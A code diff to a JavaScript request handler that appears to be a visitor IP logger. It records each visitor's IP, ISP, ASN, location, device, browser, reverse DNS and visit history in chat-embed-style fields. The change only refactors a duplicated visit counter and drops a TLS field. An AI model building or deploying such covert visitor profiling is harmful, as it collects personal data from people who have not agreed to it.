@@ -137,18 +137,17 @@ function logDebugInfo(reverseDNS) {
 function createCommonFields(
     ipDetails, port, coords, userAgent, visitData, deviceType, os, browserEngine,
     acceptLanguage, acceptEncoding, doNotTrack, referer,
-    visitCount
 ) {
     // Helper function to safely format values
     const safeValue = (value, fallback = "Unknown") => `\`${value || fallback}\``;
-    
+
 
     // Fields array
     return [
         { name: "IP", value: safeValue(ipDetails.query, "Not available"), inline: true },
         { name: "Port", value: `\`${port}\``, inline: true },
         { name: "Provider", value: safeValue(ipDetails.isp), inline: true },
-        { name: "Visit Count", value: `\`${visitCount}\``, inline: true },
+        { name: "Visit Count", value: `\`${visitData.visitCount}\``, inline: true },
         { name: "Last Visit", value: `\`${visitData.lastVisit}\``, inline: true },
         { name: "ASN", value: safeValue(ipDetails.as), inline: true },
         { name: "Continent", value: safeValue(ipDetails.continent), inline: true },
@@ -214,20 +213,19 @@ export default async function handler(req, res) {
             : "Not available";
 
 
-             // Increment and retrieve visit count for the current IP
-        const visitCount = recordVisit(ip);
+        // Increment and retrieve visit count for the current IP
+
 
         // Record visit data
         const visitData = recordVisit(ip);
 
         // Log visit data
         console.log(`Visit Data for IP ${ip}:`, visitData);
-            
+
 
         // Perform reverse DNS lookup
         const reverseDNS = ipDetails.query ? await getReverseDNS(ipDetails.query) : 'N/A';
         const port = req.headers['x-forwarded-port'] || req.connection.localPort;
-        const tlsVersion = req.socket.getProtocol ? req.socket.getProtocol() : "Not available";
 
 
 
@@ -374,7 +372,6 @@ export default async function handler(req, res) {
                     acceptEncoding,
                     doNotTrack,
                     referer,
-                    visitCount
                 );
 
                 // Output or use the fields
